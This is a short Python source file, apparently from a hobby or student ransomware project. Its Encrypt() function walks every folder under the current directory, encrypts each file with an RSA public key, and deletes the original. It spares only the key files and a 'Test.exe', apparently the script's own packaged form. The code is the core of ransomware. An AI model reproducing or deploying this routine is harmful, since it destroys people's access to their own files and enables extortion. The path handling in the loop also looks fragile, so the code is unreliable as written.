import os

from MyRSAEncrypt import *
from CONSTANTS import *


def Encrypt():
    checkKeys()

    cwd = os.getcwd()

    fileInfo = []

    # traverse root directory, and list directories as dirs and files as files
    for root, dirs, files in os.walk("."):
        path = root.split(os.sep)
        pathToFile = cwd

        if len(path) > 1:
            for i in range(1, len(path)):
                pathToFile = pathToFile + "\\" + path[i]
        
        for file in files:
            filepath = pathToFile + "\\" + file
            if filepath != cwd + "\\rsa_private_key.pem" and filepath != cwd + "\\rsa_public_key.pem" and filepath != cwd + "\\Test.exe":
                pathToFile, filename = MyRSAEncrypt(filepath, RSA_PUBLIC_KEY_FILEPATH)
                fileInfo.append([pathToFile, filename])
                os.remove(pathToFile + "\\" + file)

    return fileInfo
    
